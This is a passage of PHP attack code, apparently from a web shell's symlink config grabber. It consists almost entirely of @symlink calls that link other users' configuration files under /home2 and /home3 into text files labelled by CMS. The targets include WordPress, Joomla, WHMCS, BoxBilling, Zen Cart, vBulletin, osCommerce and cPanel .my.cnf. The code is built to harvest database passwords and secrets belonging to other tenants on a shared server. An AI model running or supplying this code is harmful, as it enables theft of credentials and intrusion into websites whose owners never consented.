@symlink('/home2/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home2/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home2/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home2/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home2/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home2/'.$user.'/public_html/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hostbills/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/Host/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/supportes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/hosting/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cart/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/client/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clients/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/cliente/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/clientes/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billing/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/billings/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/my/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/secure/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/public_html/support/order/includes/iso4217.php',$user.'-Hostbills.txt');
@symlink('/home2/'.$user.'/.my.cnf',$user.'-Cpanel.txt');
@symlink('/home2/'.$user.'/public_html/po-content/config.php',$user.'-Popoji.txt');
//Home3

@symlink('/home3/'.$user.'/public_html/vb/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forum/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/forums/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/cc/includes/config.php',$user.'-Vbulletin.txt');
@symlink('/home3/'.$user.'/public_html/inc/config.php',$user.'-MyBB.txt');
@symlink('/home3/'.$user.'/public_html/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/os/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/oscom/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/configure.php',$user.'-OsCommerce.txt');
@symlink('/home3/'.$user.'/public_html/inc/conf_global.php',$user.'-IPB.txt');
@symlink('/home3/'.$user.'/public_html/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blog/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/beta/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/portal/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/site/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wp/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/WP/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/news/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/wordpress/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/test/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/demo/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/home/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v1/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/v2/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/press/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/new/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/blogs/wp-config.php',$user.'-Wordpress.txt');
@symlink('/home3/'.$user.'/public_html/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/blog/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/submitticket.php',$user.'-^WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cms/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/beta/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/portal/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/site/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/main/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/home/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/demo/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/test/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v1/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/v2/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/joomla/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/new/configuration.php',$user.'-Joomla.txt');
@symlink('/home3/'.$user.'/public_html/WHMCS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs1/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHMC/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whmc/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/WHM/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOST/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/host/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORTES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/supportes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domains/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/domain/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/HOSTING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/hosting/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CART/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cart/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ORDER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/client/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTAREA/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientarea/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLING/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billing/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BUY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/buy/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MANAGE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/manage/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTSUPPORT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ClientSupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientsupport/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CHECKOUT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/checkout/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BASKET/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/basket/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SECURE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/SALES/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/sales/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILL/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bill/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/PURCHASE/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/purchase/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/ACCOUNT/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/account/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/USER/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/User/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/user/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/CLIENTS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clients/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/BILLINGS/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/Billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/billings/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/MY/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/My/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/my/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whm/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/secure/whmcs/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/panel/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/clientes/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/cliente/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/support/order/configuration.php',$user.'-WHMCS.txt');
@symlink('/home3/'.$user.'/public_html/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/boxbilling/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/box/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/Host/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/supportes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/hosting/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cart/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/client/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clients/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/cliente/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/clientes/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billing/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/billings/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/my/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/secure/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/support/order/bb-config.php',$user.'-BoxBilling.txt');
@symlink('/home3/'.$user.'/public_html/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/zencart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/products/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/cart/includes/dist-configure.php',$user.'-Zencart.txt');
@symlink('/home3/'.$user.'/public_html/shop/includes/dist-configure.php',$user.'-Zencart.txt');
